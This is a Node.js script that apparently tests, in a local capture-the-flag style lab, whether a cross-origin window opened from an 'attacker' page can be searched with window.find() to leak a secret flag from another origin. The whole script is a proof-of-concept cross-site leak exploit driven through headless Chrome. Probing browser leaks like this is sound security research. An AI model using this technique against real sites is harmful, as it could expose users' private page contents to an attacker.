const http = require('http');
const puppeteer = require('../../mouse in the house/analysis/browser-lab/node_modules/puppeteer-core');

const secret = http.createServer((q,r)=>r.end('<h1>PWNSEC{abc123}</h1>')).listen(9121);
const attacker = http.createServer((q,r)=>r.end(`<!doctype html><script>
(async()=>{let w=open('http://127.0.0.1:9121/'); await new Promise(r=>setTimeout(r,800));
for (const s of ['PWNSEC{','abc','zzz']) { try { document.body.append(s+':'+w.find(s)+' '); } catch(e) { document.body.append(s+':ERR:'+e+' '); } }
})();</script>`)).listen(9120);
(async()=>{const b=await puppeteer.launch({executablePath:'C:/Program Files/Google/Chrome/Application/chrome.exe',headless:true}); const p=await b.newPage(); await p.goto('http://localhost:9120'); await new Promise(r=>setTimeout(r,1800)); console.log(await p.evaluate(()=>document.body.innerText)); await b.close(); secret.close(); attacker.close();})();
